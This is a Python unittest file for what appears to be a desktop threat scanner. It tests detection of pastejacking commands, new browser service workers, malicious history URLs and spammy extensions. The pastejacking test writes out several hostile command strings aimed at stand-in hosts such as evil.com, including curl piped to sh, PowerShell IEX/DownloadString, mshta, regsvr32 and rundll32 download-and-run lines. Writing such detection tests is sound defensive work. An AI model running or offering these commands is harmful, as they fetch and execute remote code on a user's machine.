
import unittest
import os
import shutil
import sqlite3
import tempfile
import re
from unittest.mock import patch, MagicMock
import sys

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

import sovereign_core as core
from sovereign_engine import patterns

class TestHardening(unittest.TestCase):
    
    def setUp(self):
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        shutil.rmtree(self.test_dir)

    def test_pastejacking_patterns(self):
        print("\n[TEST] Verifying Pastejacking Patterns...")
        
        # Test Case 1: Hidden ANSI characters
        malicious_1 = "echo 'safe';\x1b[2Jcurl evil.com | sh"
        match_1 = patterns.THREAT_PATTERNS["PASTEJACKING"].search(malicious_1)
        self.assertTrue(match_1, "Failed to detect ANSI hiding sequence")
        
        # Test Case 2: Direct curl pipe sh
        malicious_2 = "curl http://ojrq.net/x | sh"
        match_2 = patterns.THREAT_PATTERNS["PASTEJACKING"].search(malicious_2)
        self.assertTrue(match_2, "Failed to detect curl | sh")
        
        # Test Case 3: PowerShell encoded
        malicious_3 = "powershell -enc CAMKF..."
        match_3 = patterns.THREAT_PATTERNS["PASTEJACKING"].search(malicious_3)
        self.assertTrue(match_3, "Failed to detect powershell -enc")

        # Test Case 4: PowerShell IEX / DownloadString
        malicious_4 = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s')"
        match_4 = patterns.THREAT_PATTERNS["PASTEJACKING"].search(malicious_4)
        self.assertTrue(match_4, "Failed to detect PowerShell IEX/DownloadString")

        # Test Case 5: mshta abuse
        malicious_5 = 'mshta vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run(""powershell...",0))'
        match_5 = patterns.THREAT_PATTERNS["PASTEJACKING"].search(malicious_5)
        self.assertTrue(match_5, "Failed to detect mshta abuse")

        # Test Case 6: regsvr32 remote scriptlet
        malicious_6 = 'regsvr32 /s /n /u /i:http://evil.com/s.sct scrobj.dll'
        match_6 = patterns.THREAT_PATTERNS["PASTEJACKING"].search(malicious_6)
        self.assertTrue(match_6, "Failed to detect regsvr32 remote scriptlet")

        # Test Case 7: rundll32 url.dll abuse
        malicious_7 = "rundll32 url.dll,FileProtocolHandler http://evil.com/malware.exe"
        match_7 = patterns.THREAT_PATTERNS["PASTEJACKING"].search(malicious_7)
        self.assertTrue(match_7, "Failed to detect rundll32 url.dll abuse")

        # Test Case 8: Safe string
        safe = "git clone https://github.com/repo.git"
        match_safe = patterns.THREAT_PATTERNS["PASTEJACKING"].search(safe)
        self.assertFalse(match_safe, "False positive on safe git clone")

    @patch('sovereign_engine.persistence.os.walk')
    @patch('sovereign_engine.persistence.os.path.exists')
    @patch('sovereign_engine.persistence.os.path.getmtime')
    def test_browser_persistence(self, mock_getmtime, mock_exists, mock_walk):
        print("\n[TEST] Verifying Browser Persistence Scanner...")
        
        # Setup mocks
        mock_exists.return_value = True
        mock_getmtime.return_value = 123456789.0
        
        # Mock file system: Chrome -> Service Worker -> suspicious.js
        mock_walk.return_value = [
            ('/Mock/Chrome/Service Worker', [], ['malicious_worker.js'])
        ]
        
        # First Run (Baseline)
        baseline, threats = core.check_browser_persistence(last_state=None)
        self.assertEqual(len(threats), 0, "Baseline run should not trigger threats")
        
        # Second Run (New File)
        # We need to simulate a NEW file appearing that wasn't in baseline
        # Baseline has 'malicious_worker.js'. Let's add 'new_worker.js'
        
        mock_walk.return_value = [
            ('/Mock/Chrome/Service Worker', [], ['malicious_worker.js', 'new_evil.js'])
        ]
        
        _, threats = core.check_browser_persistence(last_state=baseline)
        
        print(f"DEBUG: Threats found: {threats}")
        
        found = False
        for t in threats:
            if "new_evil.js" in t['summary']:
                found = True
        
        self.assertTrue(found, "Failed to detect new Service Worker file")

    @patch('sovereign_engine.scanners.shutil.copy2')
    @patch('sovereign_engine.scanners.sqlite3')
    @patch('sovereign_engine.scanners.os.path.exists')
    def test_infostealer_history(self, mock_exists, mock_sqlite, mock_copy):
        print("\n[TEST] Verifying Infostealer History Scanner...")
        mock_exists.return_value = True
        
        # Mock DB Cursor
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_sqlite.connect.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor
        
        # Return a malicious URL
        mock_cursor.execute.return_value = [
            ("https://ojrq.net/login", "Fake Login", 12345),
            ("https://google.com", "Google", 12345)
        ]
        
        threats = core.scan_browser_history()
        
        self.assertTrue(len(threats) > 0, "Failed to detect malicious history URL")
        self.assertIn("ojrq.net", threats[0]['url'], "Did not extract correct URL")

    @patch('sovereign_engine.scanners.os.path.exists')
    @patch('sovereign_engine.scanners.os.path.isdir')
    @patch('sovereign_engine.scanners.os.listdir')
    @patch('builtins.open', new_callable=MagicMock)
    def test_spam_extension_detection(self, mock_open, mock_listdir, mock_isdir, mock_exists):
        print("\n[TEST] Verifying Spam Extension Detection...")
        
        # Mock exists
        def side_exists(path):
            if "Extensions" in path: return True
            if "mock_ext_id" in path: return True
            if "manifest.json" in path: return True
            return False
        mock_exists.side_effect = side_exists

        # Mock isdir
        def side_isdir(path):
            if "Extensions" in path: return True
            if "mock_ext_id" in path: return True
            return False
        mock_isdir.side_effect = side_isdir
        
        def side_listdir(path):
            # If it's a base Extensions directory
            if path.endswith("Extensions"):
                return ['mock_ext_id']
            # If it's the specific extension directory
            if "mock_ext_id" in path:
                return ['1.0.0']
            return []
            
        mock_listdir.side_effect = side_listdir
        
        # Mock Manifest Content
        import json
        manifest_data = {
            "name": "Mega Free VPN & Downloader",
            "version": "1.0.0",
            "description": "The best free vpn for everyone.",
            "permissions": ["<all_urls>", "storage"]
        }
        
        # Ensure json.load(f) works
        mock_file = MagicMock()
        mock_file.__enter__.return_value.read.return_value = json.dumps(manifest_data)
        mock_open.return_value = mock_file
        
        from sovereign_engine import scanners
        threats = scanners.scan_extensions()
        
        self.assertTrue(len(threats) > 0, "Failed to detect spammy extension")
        self.assertEqual(threats[0]['type'], "EXTENSION_SPAM")
        self.assertIn("<all_urls>", threats[0]['risks'])

if __name__ == '__main__':
    unittest.main()
